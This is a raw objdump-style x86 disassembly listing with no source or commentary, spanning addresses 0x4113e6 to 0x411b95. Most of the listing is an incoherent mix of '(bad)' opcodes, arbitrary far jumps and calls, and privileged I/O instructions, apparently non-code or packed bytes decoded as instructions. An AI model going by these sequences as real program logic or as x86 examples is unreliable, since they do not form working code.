  4113e6:	loope  0x411409
  4113e8:	xchg   ebp,eax
  4113e9:	jb     0x4113f7
  4113eb:	data16 add BYTE PTR [eax],al
  4113ee:	repnz lds edi,FWORD PTR [ebx+eiz*4]
  4113f2:	pop    ebx
  4113f3:	dec    edi
  4113f4:	popa   
  4113f5:	les    edx,FWORD PTR [eax+eax*1-0x7b193f00]
  4113fc:	mov    dl,0x0
  4113fe:	add    dl,dl
  411400:	jmp    0xec7d:0x1de347bf
  411407:	(bad)  
  411408:	mov    al,0x6a
  41140a:	xchg   ebx,eax
  41140b:	cmp    eax,0x8e4c69
  411410:	add    BYTE PTR [ebp-0x10],bh
  411413:	sbb    al,0xf6
  411415:	into   
  411416:	(bad)  
  411417:	outs   dx,BYTE PTR ds:[esi]
  411418:	push   ebx
  411419:	dec    edx
  41141a:	(bad)  
  41141b:	push   edx
  41141c:	or     BYTE PTR [edi],ch
  41141e:	add    BYTE PTR [eax],al
  411420:	mov    BYTE PTR ds:0xfa360000,cl
  411426:	push   esi
  411427:	ja     0x4113bc
  411429:	mov    edi,0x806665a5
  41142e:	jp     0x411430
  411430:	add    BYTE PTR [edx-0x75c39d2],ah
  411436:	xchg   DWORD PTR [esi],ebx
  411438:	or     DWORD PTR [ebx],esi
  41143a:	add    BYTE PTR [edx+0x0],ah
  41143d:	add    bl,bl
  41143f:	push   es
  411440:	xor    DWORD PTR [edx],ebx
  411442:	daa    
  411443:	push   ss
  411444:	or     al,0xe7
  411446:	add    BYTE PTR [eax],al
  411448:	jb     0x41146d
  41144a:	cmp    al,0xa3
  41144c:	sbb    edx,DWORD PTR [ebx]
  41144e:	push   ss
  41144f:	sub    eax,0x782cd1aa
  411454:	retf   
  411455:	adc    DWORD PTR cs:[edi+0xbbc821],esp
  41145c:	add    BYTE PTR ds:0x40daac8b,dh
  411462:	mov    esp,0x1bb50000
  411467:	push   0xffffffaf
  411469:	ins    BYTE PTR es:[edi],dx
  41146a:	jle    0x411478
  41146c:	in     al,dx
  41146d:	add    BYTE PTR [eax],al
  41146f:	mov    ebx,ebx
  411471:	dec    ecx
  411472:	jl     0x4114eb
  411474:	jmp    0x1c4d:0x1bcc
  41147b:	push   0x4a
  41147d:	out    0xc6,eax
  41147f:	aas    
  411480:	fsubr  DWORD PTR [eax+0x35]
  411483:	hlt    
  411484:	jp     0x411498
  411486:	mov    es,edi
  411488:	test   DWORD PTR [ebx-0x36],0x7e1b4b2a
  41148f:	jae    0x411490
  411491:	(bad)  
  411492:	int3   
  411493:	add    BYTE PTR [eax],al
  411495:	pop    esi
  411496:	fcmovbe st,st(2)
  411498:	push   ebx
  411499:	fs out 0x56,eax
  41149c:	lock xor BYTE PTR [ebp-0x352ade5d],ah
  4114a3:	add    eax,0x7b3a1561
  4114a8:	cmp    esi,ebp
  4114aa:	xchg   ebx,eax
  4114ab:	inc    edi
  4114ac:	iret   
  4114ad:	jns    0x4114c4
  4114af:	adc    BYTE PTR [eax-0x41],al
  4114b2:	add    BYTE PTR [eax],al
  4114b4:	fucompp 
  4114b6:	sub    al,0xb6
  4114b8:	dec    eax
  4114b9:	cmp    al,0x0
  4114bb:	add    BYTE PTR [esi],ah
  4114bd:	pop    edi
  4114be:	(bad)
  4114c1:	sub    al,0x7c
  4114c3:	into   
  4114c4:	jecxz  0x41153f
  4114c6:	sti    
  4114c7:	popa   
  4114c8:	dec    esp
  4114c9:	push   ss
  4114ca:	add    BYTE PTR [eax],al
  4114cc:	out    dx,al
  4114cd:	xor    ebx,DWORD PTR [ebx+0xd62fcf0]
  4114d3:	test   eax,0x491fdc52
  4114d8:	cmp    cl,dl
  4114da:	inc    ecx
  4114db:	jle    0x41148f
  4114dd:	add    BYTE PTR [ebp+0x0],al
  4114e0:	add    BYTE PTR [eax*1-0x1342fa9d],bl
  4114e7:	pop    ebx
  4114e8:	out    0x6c,eax
  4114ea:	push   es
  4114eb:	push   edx
  4114ec:	sbb    al,bh
  4114ee:	retf   0x5a4b
  4114f1:	pop    esp
  4114f2:	aam    0xf2
  4114f4:	(bad)
  4114f8:	add    BYTE PTR [ebp-0xac5e6a4],cl
  4114fe:	in     eax,0x3
  411500:	cli    
  411501:	jecxz  0x4114af
  411503:	pop    ebx
  411504:	je     0x4114f0
  411506:	loopne 0x4114ba
  411508:	daa    
  411509:	push   cs
  41150a:	push   esi
  41150b:	pushf  
  41150c:	push   ecx
  41150d:	out    dx,eax
  41150e:	data16 jle 0x4114b2
  411511:	lods   al,BYTE PTR ds:[esi]
  411512:	mov    dh,BYTE PTR [ebx]
  411514:	fcmovnu st,st(1)
  411516:	ror    dl,0x0
  411519:	add    ah,bh
  41151b:	jg     0x4114d0
  41151d:	rol    DWORD PTR [edi+0x3316d641],0x1f
  411524:	lahf   
  411525:	(bad)  
  411526:	ja     0x411513
  411528:	mov    edx,0x795e15e2
  41152d:	sti    
  41152e:	cmp    BYTE PTR [edi+ebp*1+0x7cd4fc23],dh
  411535:	mov    al,0x77
  411537:	je     0x41151a
  411539:	fsubr  QWORD PTR fs:0x287117f
  411540:	in     al,0x74
  411542:	jne    0x41152e
  411544:	inc    edx
  411545:	jae    0x4114d9
  411547:	out    dx,al
  411548:	addr16 test eax,0x9efcc9dc
  41154e:	and    al,0x61
  411550:	push   edx
  411551:	icebp  
  411552:	aas    
  411553:	push   esi
  411554:	push   ebp
  411555:	ins    DWORD PTR es:[edi],dx
  411556:	shl    cl,0x0
  411559:	add    BYTE PTR [edx+0x22],bl
  41155c:	fstp   QWORD PTR [edx]
  41155e:	mov    fs,WORD PTR [esi-0x80]
  411561:	mov    edx,0x75a40000
  411566:	test   DWORD PTR [eax+0x4a],esi
  411569:	mov    DWORD PTR [eax+0x51000060],0xcc69c6ce
  411573:	aam    0x0
  411575:	add    BYTE PTR [eax-0x4a5b19e2],ch
  41157b:	pop    eax
  41157c:	ins    DWORD PTR es:[edi],dx
  41157d:	test   bl,bl
  41157f:	add    BYTE PTR [eax],al
  411581:	fnstcw WORD PTR [esi-0x48]
  411584:	or     eax,0xb5184365
  411589:	lock adc al,0x6b
  41158c:	fidiv  WORD PTR [ebx+0xb]
  41158f:	xor    al,0x3
  411591:	mov    edx,0x8ad868fb
  411596:	pusha  
  411597:	jb     0x411554
  411599:	jbe    0x411553
  41159b:	jp     0x40062604
  4115a1:	and    al,0x70
  4115a3:	push   eax
  4115a4:	xchg   edi,eax
  4115a5:	les    ecx,FWORD PTR [eax+eax*1+0x0]
  4115a9:	push   cs
  4115aa:	rsqrtps xmm1,XMMWORD PTR ds:0x4dd0814e
  4115b1:	(bad)  
  4115b2:	mov    ds:0xf5f675f7,al
  4115b7:	lock cmp cl,0xfa
  4115bb:	stos   BYTE PTR es:[edi],al
  4115bc:	dec    eax
  4115bd:	nop
  4115be:	add    BYTE PTR [eax],al
  4115c0:	int    0xe3
  4115c2:	jl     0x4115af
  4115c4:	mov    al,dh
  4115c6:	out    0x3f,al
  4115c8:	stc    
  4115c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115ca:	dec    ebx
  4115cb:	xchg   ch,bh
  4115cd:	pop    ss
  4115ce:	je     0x411581
  4115d0:	jmp    0x6a24b5a5
  4115d5:	jp     0x41157d
  4115d7:	rol    ah,cl
  4115d9:	cld    
  4115da:	add    BYTE PTR [eax],al
  4115dc:	mov    gs,WORD PTR [edx]
  4115de:	retf   
  4115df:	add    al,0xa5
  4115e1:	add    BYTE PTR [eax],al
  4115e3:	enter  0xe3,0x0
  4115e7:	gs push esp
  4115e9:	fldcw  WORD PTR [eax-0x4b3490d2]
  4115ef:	cdq    
  4115f0:	xchg   BYTE PTR [eax-0x22c58962],dl
  4115f6:	or     edx,DWORD PTR [ebx]
  4115f8:	jmp    0xba4cdb83
  4115fd:	aas    
  4115fe:	(bad)  
  4115ff:	out    0xb9,eax
  411601:	call   0x8d2:0x5a9996e2
  411608:	mov    edx,0x7cb60000
  41160d:	(bad)  
  41160e:	in     al,0x8
  411610:	and    DWORD PTR [eax],eax
  411612:	add    BYTE PTR [ebx+0x14dc582f],ch
  411618:	data16 je 0x4115d2
  41161b:	mov    edx,0xe1c3c753
  411620:	and    ebx,edi
  411622:	sbb    al,0x41
  411624:	ret    
  411625:	pop    edi
  411626:	cwde   
  411627:	and    edi,esi
  411629:	inc    esp
  41162a:	nop
  41162b:	add    BYTE PTR [eax],al
  41162d:	int    0xb9
  41162f:	pusha  
  411630:	pop    edi
  411631:	inc    ebx
  411632:	push   edx
  411633:	outs   dx,DWORD PTR ds:[esi]
  411634:	lahf   
  411635:	mov    ebx,0xadc8
  41163a:	iret   
  41163b:	xchg   edx,eax
  41163c:	or     DWORD PTR [edx],0xffffff89
  41163f:	push   ds
  411640:	fsub   QWORD PTR [esi]
  411642:	jae    0x411618
  411644:	jmp    0x9068792c
  411649:	leave  
  41164a:	adc    esp,esi
  41164c:	jb     0x411603
  41164e:	call   0xf858bba4
  411653:	fld    st(4)
  411655:	outs   dx,DWORD PTR ds:[esi]
  411656:	add    BYTE PTR [eax],al
  411658:	add    al,0x7c
  41165a:	add    BYTE PTR [eax],al
  41165c:	icebp  
  41165d:	or     BYTE PTR [edx+0x0],bl
  411660:	add    BYTE PTR [ebx+0xd600ec],al
  411666:	add    BYTE PTR [ecx+ecx*2-0x17],ah
  41166a:	jo     0x411607
  41166c:	imul   ebp,DWORD PTR gs:[ecx+0xb],0xbea3e3d9
  411674:	jbe    0x411615
  411676:	cmp    BYTE PTR [edx],0x0
  411679:	add    BYTE PTR [eax-0xbb8e17],bh
  41167f:	add    BYTE PTR [eax],al
  411681:	dec    edx
  411682:	dec    esp
  411683:	xchg   BYTE PTR [eax],al
  411685:	add    BYTE PTR [ebx],bl
  411687:	xchg   esi,eax
  411688:	mov    ebp,0x9922935a
  41168d:	jnp    0x411661
  41168f:	mov    al,ds:0xac1f8579
  411694:	inc    esi
  411695:	pop    esi
  411696:	push   eax
  411697:	push   es
  411698:	mov    WORD PTR [eax-0x31650000],cs
  41169e:	dec    edx
  41169f:	or     BYTE PTR [ebx],cl
  4116a1:	add    BYTE PTR [eax],al
  4116a3:	mov    ebx,0x9e350daf
  4116a8:	adc    al,BYTE PTR [eax-0x17]
  4116ab:	add    BYTE PTR [eax],al
  4116ad:	xchg   edx,eax
  4116ae:	stc    
  4116af:	xchg   DWORD PTR [esi+0xa],ecx
  4116b2:	mov    ds:0xdb672c51,eax
  4116b7:	cld    
  4116b8:	mov    ecx,0xea0cd7
  4116bd:	add    BYTE PTR [edx-0x10],ch
  4116c0:	xchg   ebx,eax
  4116c1:	adc    ebx,DWORD PTR [ebp+0x7fa32a57]
  4116c7:	loopne 0x41171e
  4116c9:	mov    edi,esi
  4116cb:	or     cl,BYTE PTR [edi+0x2684]
  4116d1:	xor    al,0x7b
  4116d3:	stc    
  4116d4:	jno    0x411682
  4116d6:	icebp  
  4116d7:	sbb    eax,ebx
  4116d9:	pop    ecx
  4116da:	sub    al,0xa6
  4116dc:	fnstenv [ebx+0x1153dd19]
  4116e2:	(bad)  
  4116e3:	sub    eax,0xa51bc755
  4116e8:	push   ecx
  4116e9:	mov    ds:0xa94231ba,eax
  4116ee:	enter  0xe3,0x0
  4116f2:	add    DWORD PTR [edx-0x1b],esp
  4116f5:	jns    0x411768
  4116f7:	push   0x21099f2f
  4116fc:	inc    edx
  4116fd:	xor    eax,0xce7cee32
  411702:	lds    edx,FWORD PTR [eax+0x53]
  411705:	arpl   WORD PTR [esi],bp
  411707:	pop    ebp
  411708:	push   ecx
  411709:	enter  0xad,0x0
  41170d:	pop    edi
  41170e:	push   edi
  41170f:	call   0xd76c:0xb6e02a18
  411716:	clc    
  411717:	je     0x411788
  411719:	mov    ecx,DWORD PTR [edi-0x266700e7]
  41171f:	push   ebx
  411720:	mov    ecx,0x58db1f73
  411725:	(bad)  
  411726:	ja     0x411770
  411728:	jle    0x41172a
  41172a:	add    BYTE PTR [edi+0x1a],bh
  41172d:	(bad)  
  41172e:	cmp    edx,DWORD PTR [eax-0x6a385d73]
  411734:	adc    dh,BYTE PTR [edx-0x51]
  411737:	and    cl,cl
  411739:	mov    dl,BYTE PTR [esi-0x3c]
  41173c:	les    eax,FWORD PTR [eax]
  41173e:	add    BYTE PTR [esi+edi*1+0x39],bh
  411742:	cmp    cl,BYTE PTR [eax+eax*8]
  411745:	add    BYTE PTR [eax],al
  411747:	dec    esp
  411748:	add    eax,0xb5950000
  41174d:	loope  0x411742
  41174f:	jmp    0x2b4ba210
  411754:	mov    dh,0x2a
  411756:	inc    eax
  411757:	arpl   WORD PTR [eax],ax
  411759:	add    dl,bh
  41175b:	push   ecx
  41175c:	xor    edx,esi
  41175e:	imul   eax,esi,0xe844
  411764:	push   ebx
  411765:	cmp    al,0x98
  411767:	outs   dx,BYTE PTR ds:[esi]
  411768:	mov    edi,DWORD PTR [edi-0x69]
  41176b:	dec    edx
  41176c:	je     0x4117ba
  41176e:	retf   
  41176f:	add    BYTE PTR [eax],al
  411771:	mov    al,ds:0x1b474593
  411776:	mov    eax,ds:0x8e3d9ac3
  41177b:	neg    esi
  41177d:	mov    ebp,0x58c2e931
  411782:	dec    ebx
  411783:	mov    ebp,0x3735c9d4
  411788:	adc    esi,DWORD PTR gs:[eax]
  41178b:	push   ds
  41178c:	xor    DWORD PTR [eax],ebx
  41178e:	cwde   
  41178f:	jle    0x411791
  411791:	push   ecx
  411792:	add    BYTE PTR [eax],al
  411794:	dec    edi
  411795:	into   
  411796:	sub    eax,0xaeb65959
  41179b:	jmp    0xafb40a01
  4117a0:	stos   BYTE PTR es:[edi],al
  4117a1:	out    dx,al
  4117a2:	and    al,0x4c
  4117a4:	xor    al,BYTE PTR [eax]
  4117a6:	add    ah,al
  4117a8:	xchg   DWORD PTR [eax],eax
  4117aa:	add    BYTE PTR [esi+0x42],dh
  4117ad:	lds    esp,FWORD PTR [edx-0x44]
  4117b0:	fs xor al,0x83
  4117b3:	mov    ds:0x5baee64f,eax
  4117b8:	int    0x82
  4117ba:	adc    eax,0x87893ea7
  4117bf:	pop    esi
  4117c0:	jb     0x4117b4
  4117c2:	inc    edi
  4117c3:	mov    ecx,DWORD PTR [esi]
  4117c5:	lods   al,BYTE PTR ds:[esi]
  4117c6:	outs   dx,DWORD PTR ds:[esi]
  4117c7:	neg    cl
  4117c9:	xchg   ecx,eax
  4117ca:	popa   
  4117cb:	jno    0x411786
  4117cd:	add    cl,BYTE PTR [edx+0xbf4094]
  4117d3:	add    ah,cl
  4117d5:	xor    eax,0x86000000
  4117da:	add    BYTE PTR [eax],al
  4117dc:	and    BYTE PTR [edx],dl
  4117de:	clc    
  4117df:	jmp    0xe29a:0x4d07b219
  4117e6:	inc    edi
  4117e7:	sub    DWORD PTR [ecx+0x32],ebx
  4117ea:	ror    DWORD PTR [edx+edi*1+0x0],0x0
  4117ef:	pop    edi
  4117f0:	sbb    eax,0x4741a65f
  4117f5:	sub    ch,BYTE PTR [edx]
  4117f7:	or     BYTE PTR [eax+eax*1-0x55ccc900],bl
  4117fe:	ss dec ebx
  411800:	dec    ebx
  411801:	inc    ebp
  411802:	push   edx
  411803:	mov    edx,0x8f837ac2
  411808:	fiadd  WORD PTR cs:[eax]
  41180b:	jno    0x41180d
  41180d:	add    ah,dl
  41180f:	xor    eax,0x370b6afa
  411814:	call   0xe7a63e63
  411819:	or     bh,BYTE PTR [ebx+0x6c]
  41181c:	mov    eax,0x181378b9
  411821:	jae    0x411833
  411823:	sahf   
  411824:	add    ah,cl
  411826:	add    BYTE PTR [eax],al
  411828:	cmp    al,dl
  41182a:	popf   
  41182b:	jmp    0xcc4c62e
  411830:	rol    BYTE PTR [eax],0x0
  411833:	fs jmp 0xaf00:0x8d8ccb
  41183b:	imul   edi,esp,0x2f
  41183e:	data16 icebp 
  411840:	aam    0x71
  411842:	retf   0x6467
  411845:	outs   dx,DWORD PTR ds:[esi]
  411846:	aad    0x4e
  411848:	sub    ch,BYTE PTR [eax]
  41184a:	dec    eax
  41184b:	add    al,BYTE PTR [eax]
  41184d:	add    BYTE PTR [esi+edx*1+0x31],ch
  411851:	cmp    eax,0xd2d15cf
  411856:	sbb    eax,0xa4dc6099
  41185b:	dec    ecx
  41185c:	test   DWORD PTR [esi-0x46],edi
  41185f:	mov    ds:0xf1dc6c7d,eax
  411864:	les    ecx,FWORD PTR [eax+0x0]
  411867:	add    BYTE PTR [ebp-0x2f],dh
  41186a:	sbb    bl,bh
  41186c:	les    edi,FWORD PTR [eax-0x42260000]
  411872:	in     al,dx
  411873:	in     al,dx
  411874:	loopne 0x411825
  411876:	mov    dl,0x73
  411878:	mov    ah,0x57
  41187a:	aas    
  41187b:	xlat   BYTE PTR ds:[ebx]
  41187c:	aad    0xc9
  41187e:	sahf   
  41187f:	mov    al,ds:0xe4e3cd4a
  411884:	ins    WORD PTR es:[edi],dx
  411886:	mov    cl,0xab
  411888:	sub    DWORD PTR [ebx-0x43],esp
  41188b:	inc    edi
  41188c:	inc    ecx
  41188d:	sub    DWORD PTR [esi+0x7a],0x26caae17
  411894:	sub    eax,0x3c3f54be
  411899:	ret    
  41189a:	adc    al,0xf
  41189c:	std    
  41189d:	adc    bh,BYTE PTR [edi+0x15c8314d]
  4118a3:	add    BYTE PTR [eax],al
  4118a5:	cmp    al,0x47
  4118a7:	pop    es
  4118a8:	pop    ebp
  4118a9:	dec    eax
  4118aa:	jp     0x4118ac
  4118ac:	add    BYTE PTR [edi],dh
  4118ae:	jp     0x41186b
  4118b0:	out    0xee,al
  4118b2:	mov    al,dh
  4118b4:	pop    edx
  4118b5:	div    DWORD PTR [edx]
  4118b7:	cmp    dh,BYTE PTR [ebp+0x21]
  4118ba:	dec    edx
  4118bb:	mov    edx,0xfd264745
  4118c0:	lods   al,BYTE PTR ds:[esi]
  4118c1:	test   DWORD PTR [ebx-0x13],eax
  4118c4:	xchg   ebp,eax
  4118c5:	pushf  
  4118c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118c7:	mov    dh,0xe4
  4118c9:	dec    edi
  4118ca:	cmp    al,0x71
  4118cc:	and    al,0x45
  4118ce:	push   ebp
  4118cf:	cli    
  4118d0:	out    dx,al
  4118d1:	jnp    0x4118a9
  4118d3:	clc    
  4118d4:	pop    ebp
  4118d5:	outs   dx,DWORD PTR ds:[esi]
  4118d6:	xchg   edi,eax
  4118d7:	int    0xa0
  4118d9:	sub    bl,cl
  4118db:	add    DWORD PTR [esi+0x3a],0x967737b5
  4118e2:	and    DWORD PTR [edx],edi
  4118e4:	fs pop ebx
  4118e6:	jl     0x411881
  4118e8:	clc    
  4118e9:	pop    es
  4118ea:	lods   eax,DWORD PTR fs:[esi]
  4118ec:	jb     0x4118a5
  4118ee:	aas    
  4118ef:	fadd   DWORD PTR [ebp+0x7fd2bc93]
  4118f5:	inc    esi
  4118f6:	pop    ss
  4118f7:	pop    ebx
  4118f8:	jo     0x411942
  4118fa:	imul   eax,DWORD PTR [eax],0x0
  4118fd:	fisttp QWORD PTR ds:0x7f2464ca
  411903:	inc    eax
  411904:	sahf   
  411905:	add    BYTE PTR [eax],al
  411907:	sub    dl,BYTE PTR [edx+0x76a0b21a]
  41190d:	xchg   DWORD PTR [ecx],ebx
  41190f:	std    
  411910:	fstp   TBYTE PTR [ebp+0x45]
  411913:	pop    ss
  411914:	push   edi
  411915:	inc    eax
  411916:	add    BYTE PTR [eax],0x0
  411919:	fiadd  WORD PTR [ecx+0xe9c9df6]
  41191f:	push   ss
  411920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411921:	in     al,0x6a
  411923:	das    
  411924:	mov    cl,0xdb
  411926:	repnz loope 0x411975
  411929:	pushf  
  41192a:	add    BYTE PTR [eax],al
  41192c:	and    edi,DWORD PTR [ebp-0x44]
  41192f:	ja     0x4118b3
  411931:	in     al,dx
  411932:	cmp    DWORD PTR [ecx],esp
  411934:	fwait
  411935:	xchg   edi,eax
  411936:	(bad)  
  411938:	int    0xa7
  41193a:	pop    edi
  41193b:	mov    esp,0x6b509968
  411940:	push   ecx
  411941:	dec    edx
  411942:	lock xchg ecx,eax
  411944:	xchg   edi,eax
  411945:	ins    DWORD PTR es:[edi],dx
  411946:	sub    edx,DWORD PTR [edi-0x75]
  411949:	mov    ebp,0x5a249fe1
  41194e:	cmp    eax,0x271ee32c
  411953:	retf   
  411954:	(bad)  
  411955:	mov    bl,BYTE PTR [edx+0x35]
  411958:	jo     0x4119b0
  41195a:	rol    DWORD PTR [ecx+0x1e],cl
  41195d:	imul   ebp,DWORD PTR [edx],0xffffffdd
  411960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411961:	shl    DWORD PTR [ebx],1
  411963:	cmp    edx,eax
  411965:	pop    edx
  411966:	out    dx,eax
  411967:	sbb    DWORD PTR [esp+edx*2-0x3aa60000],eax
  41196e:	mov    dl,0xf3
  411970:	dec    esi
  411971:	repnz fiadd DWORD PTR [ebx-0xd]
  411975:	jp     0x4118ff
  411977:	push   es
  411978:	add    BYTE PTR [eax],al
  41197a:	scas   eax,DWORD PTR es:[edi]
  41197b:	jbe    0x4119b3
  41197d:	dec    esp
  41197e:	mov    DWORD PTR [eax],eax
  411980:	add    BYTE PTR [edx-0x2f],cl
  411983:	push   eax
  411984:	sbb    DWORD PTR [ebx],esi
  411986:	jge    0x4119a6
  411988:	mov    al,ds:0x3a6ad6ec
  41198d:	loop   0x4119dd
  41198f:	cdq    
  411990:	test   BYTE PTR [ebx],bh
  411992:	add    BYTE PTR [eax],al
  411994:	inc    ecx
  411995:	sub    eax,0xc0733664
  41199a:	mov    ds:0x4ad00000,eax
  41199f:	sbb    dh,dh
  4119a1:	adc    eax,0x2486697c
  4119a6:	gs dec edi
  4119a8:	ficom  DWORD PTR [edx]
  4119aa:	sbb    bh,BYTE PTR [eax]
  4119ac:	repz xchg esp,eax
  4119ae:	out    0x28,eax
  4119b0:	pushf  
  4119b1:	loopne 0x4119f3
  4119b3:	sbb    BYTE PTR [eax],al
  4119b5:	add    BYTE PTR [esi-0x573aa5ca],ah
  4119bb:	ins    BYTE PTR es:[edi],dx
  4119bc:	fsubr  QWORD PTR [ecx+0x47c435]
  4119c2:	add    BYTE PTR [esi+0x4a],cl
  4119c5:	popf   
  4119c6:	nop
  4119c7:	inc    esi
  4119c8:	sbb    esi,ebp
  4119ca:	test   eax,0xf0dcb99
  4119cf:	sub    al,0xc4
  4119d1:	push   esp
  4119d2:	add    BYTE PTR [eax],al
  4119d4:	popf   
  4119d5:	mov    esp,0x8500
  4119da:	mov    edi,0x5af835a6
  4119df:	ror    bl,1
  4119e1:	es call 0x360a:0x68fb17c3
  4119e9:	xor    edx,ebp
  4119eb:	dec    edx
  4119ec:	pop    eax
  4119ed:	jno    0x411a4b
  4119ef:	fstp   TBYTE PTR [edx]
  4119f1:	mov    dh,BYTE PTR [eax]
  4119f3:	mov    ds:0x158b8378,eax
  4119f8:	dec    ecx
  4119f9:	dec    ebp
  4119fa:	scas   eax,DWORD PTR es:[edi]
  4119fb:	shl    DWORD PTR [eax+ebx*2],0x55
  4119ff:	mov    cl,cl
  411a01:	push   0x7d0ac259
  411a06:	aas    
  411a07:	mov    al,BYTE PTR [eax+0x4c]
  411a0a:	add    BYTE PTR [eax],al
  411a0c:	push   eax
  411a0d:	push   esp
  411a0e:	xchg   DWORD PTR [eax],ebp
  411a10:	sbb    DWORD PTR [ecx+0x42],0xf5ad3805
  411a17:	std    
  411a18:	push   edx
  411a19:	pop    edx
  411a1a:	ins    DWORD PTR es:[edi],dx
  411a1b:	pop    edi
  411a1c:	lods   al,BYTE PTR ds:[esi]
  411a1d:	dec    edi
  411a1e:	pop    eax
  411a1f:	mov    WORD PTR [ebp+0x0],ds
  411a22:	add    BYTE PTR [eax+edi*1],dl
  411a25:	stc    
  411a26:	icebp  
  411a27:	push   edx
  411a28:	dec    edi
  411a29:	(bad)  
  411a2b:	jg     0x411a22
  411a2d:	call   0x73bf:0x3c4be8fa
  411a34:	push   ebp
  411a35:	cmp    ah,BYTE PTR [ecx+edx*4+0x349b6629]
  411a3c:	adc    BYTE PTR [ecx],dh
  411a3e:	pop    ss
  411a3f:	call   0x69:0xcf0e67e
  411a46:	add    BYTE PTR ds:0xb2de4f1a,ch
  411a4c:	cmp    ch,bl
  411a4e:	test   al,0xea
  411a50:	(bad)  
  411a51:	(bad)  
  411a52:	xor    eax,DWORD PTR [ebx+edi*8]
  411a55:	add    BYTE PTR [eax],al
  411a57:	cmp    BYTE PTR [ecx],cl
  411a59:	jnp    0x4119ff
  411a5b:	jb     0x411a47
  411a5d:	sbb    eax,DWORD PTR [esi+eiz*2-0x6c900000]
  411a64:	jmp    0x411abd
  411a66:	push   ss
  411a67:	and    al,BYTE PTR [ebx]
  411a69:	in     al,dx
  411a6a:	ret    0x11ed
  411a6d:	xor    eax,0xda4b6703
  411a72:	retf   
  411a73:	mov    dh,0xab
  411a75:	push   eax
  411a76:	inc    ebp
  411a77:	push   es
  411a78:	daa    
  411a79:	fs push edi
  411a7b:	sub    al,dl
  411a7d:	ret    0x8b90
  411a80:	scas   al,BYTE PTR es:[edi]
  411a81:	ret    
  411a82:	dec    eax
  411a83:	popa   
  411a84:	add    BYTE PTR [eax],al
  411a86:	cmp    esi,DWORD PTR [edi+0x57]
  411a89:	test   BYTE PTR [edi],bl
  411a8b:	add    BYTE PTR [eax],al
  411a8d:	jecxz  0x411a58
  411a8f:	pop    eax
  411a90:	into   
  411a91:	out    dx,eax
  411a92:	inc    ebx
  411a93:	jl     0x411adb
  411a95:	fwait
  411a96:	clc    
  411a97:	(bad)  
  411a98:	js     0x411b11
  411a9a:	mov    ds:0xd1b92ca1,al
  411a9f:	add    al,ah
  411aa1:	ins    DWORD PTR es:[edi],dx
  411aa2:	add    BYTE PTR [eax],al
  411aa4:	mov    ah,0x5e
  411aa6:	xchg   ecx,eax
  411aa7:	cli    
  411aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aa9:	cwde   
  411aaa:	dec    eax
  411aab:	mov    bl,0x0
  411aad:	add    BYTE PTR [edi+0x636a437b],dh
  411ab3:	sub    esp,DWORD PTR [eax]
  411ab5:	jnp    0x411b22
  411ab7:	dec    esi
  411ab8:	gs mov ebp,0xd6d6d789
  411abe:	iret   
  411abf:	test   eax,0xff0393b8
  411ac4:	lods   eax,DWORD PTR ds:[esi]
  411ac5:	mov    al,0xb9
  411ac7:	pop    ebp
  411ac8:	or     DWORD PTR [edx-0x46],esp
  411acb:	sbb    al,0x29
  411acd:	ret    0xe633
  411ad0:	gs (bad) 
  411ad3:	xor    al,0xf1
  411ad5:	adc    edx,DWORD PTR [ecx+0x17]
  411ad8:	and    eax,0x3d92eb30
  411add:	das    
  411ade:	or     eax,0x7a34720e
  411ae3:	cmp    bh,bl
  411ae5:	icebp  
  411ae6:	pop    ds
  411ae7:	je     0x411a73
  411ae9:	retf   
  411aea:	dec    edi
  411aeb:	dec    eax
  411aec:	mov    WORD PTR [eax],es
  411aee:	add    BYTE PTR [ecx],ah
  411af0:	sahf   
  411af1:	inc    ecx
  411af2:	ficom  WORD PTR [esi]
  411af4:	ja     0x411abc
  411af6:	sti    
  411af7:	rcr    ebp,cl
  411af9:	dec    esp
  411afa:	sbb    al,BYTE PTR [eax]
  411afc:	add    BYTE PTR [edx+ebx*8-0x4f],ah
  411b00:	in     eax,0xcc
  411b02:	jo     0x411b04
  411b04:	add    dl,dh
  411b06:	loopne 0x411b1b
  411b08:	mov    dh,0x7f
  411b0a:	not    BYTE PTR [edx]
  411b0c:	repz push eax
  411b0e:	mov    eax,DWORD PTR [edx-0x53e8455c]
  411b14:	adc    eax,0xcdb4b46b
  411b19:	xchg   edx,eax
  411b1a:	mov    BYTE PTR [eax+eax*1+0x61ac5a00],al
  411b21:	ret    
  411b22:	(bad)  
  411b23:	out    0x85,eax
  411b25:	or     DWORD PTR [ecx],ebp
  411b27:	xchg   esi,eax
  411b28:	lods   eax,DWORD PTR ds:[esi]
  411b29:	mov    ?,WORD PTR ds:0x13bd70b6
  411b2f:	mov    esp,0x2e17cbea
  411b34:	sbb    DWORD PTR [ecx-0x1c],edx
  411b37:	xlat   BYTE PTR ds:[ebx]
  411b38:	fsub   DWORD PTR [eax+edx*4]
  411b3b:	xor    al,BYTE PTR [edx+0x77]
  411b3e:	dec    esp
  411b3f:	mov    ds:0xb6850000,al
  411b44:	or     al,0x18
  411b46:	add    BYTE PTR [eax],al
  411b48:	mov    eax,ds:0xd3ccb6
  411b4d:	add    BYTE PTR [edi],al
  411b4f:	push   ebp
  411b50:	pop    edi
  411b51:	pop    edi
  411b52:	dec    ecx
  411b53:	dec    ebx
  411b54:	es push ecx
  411b56:	dec    ebp
  411b57:	pop    ds
  411b58:	repz push ds
  411b5a:	cmp    al,BYTE PTR [ebx+ebp*8+0x0]
  411b5e:	add    dh,bh
  411b60:	xchg   esp,eax
  411b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b62:	push   edi
  411b63:	test   eax,0xe4e99a0e
  411b68:	cs stc 
  411b6a:	lock into 
  411b6c:	and    DWORD PTR [ecx-0x6e],edx
  411b6f:	push   ebx
  411b70:	or     eax,0x2404c5
  411b75:	add    BYTE PTR [ecx+0x6d],bl
  411b78:	ins    BYTE PTR es:[edi],dx
  411b79:	mov    ds:0x4cc46c,al
  411b7e:	add    BYTE PTR [edi-0xf],ah
  411b81:	in     al,0x67
  411b83:	inc    edx
  411b84:	mov    al,0x4b
  411b86:	call   0x9854c24a
  411b8b:	ja     0x411bae
  411b8d:	xor    eax,0x524674ce
  411b92:	cdq    
  411b93:	int3   
  411b94:	out    dx,eax
  411b95:	add    BYTE PTR [eax],al
